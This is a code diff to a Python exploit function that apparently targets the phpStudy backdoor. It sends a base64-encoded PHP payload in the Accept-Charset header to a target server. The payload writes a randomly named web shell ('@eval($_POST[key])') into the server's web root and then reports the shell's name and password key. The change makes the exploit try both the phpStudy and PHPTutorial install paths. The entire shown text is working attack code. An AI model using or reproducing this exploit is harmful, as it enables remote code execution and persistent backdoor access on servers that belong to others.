@@ -21,11 +21,15 @@ def exp():
 
     shell_name = ''.join(random.sample(string.ascii_letters+string.digits,8))
     key = ''.join(random.sample(string.ascii_letters+string.digits,4))
-
-    exp = f"fputs(fopen('{path}\PHPTutorial\WWW\{shell_name}.php','w'),'<?php @eval($_POST[{key}]); ?>');"
-    exp_encode = str(base64.b64encode(exp.encode('utf-8'))).split("'",2)[1]
-    head['Accept-Charset'] = exp_encode
-    requests.get(url=url, headers=head, timeout=5, allow_redirects=False)
+    def write_shell(version_path):
+        exp = f"fputs(fopen('{path}\{version_path}\WWW\{shell_name}.php','w'),'<?php @eval($_POST[{key}]); ?>');"
+        exp_encode = str(base64.b64encode(exp.encode('utf-8'))).split("'",2)[1]
+        head['Accept-Charset'] = exp_encode
+        requests.get(url=url, headers=head, timeout=5, allow_redirects=False)
+    try:
+        write_shell('phpStudy')
+    except:
+        write_shell('PHPTutorial')
 
     return f"[!] Shell_name={shell_name}.php, Key={key}"
 
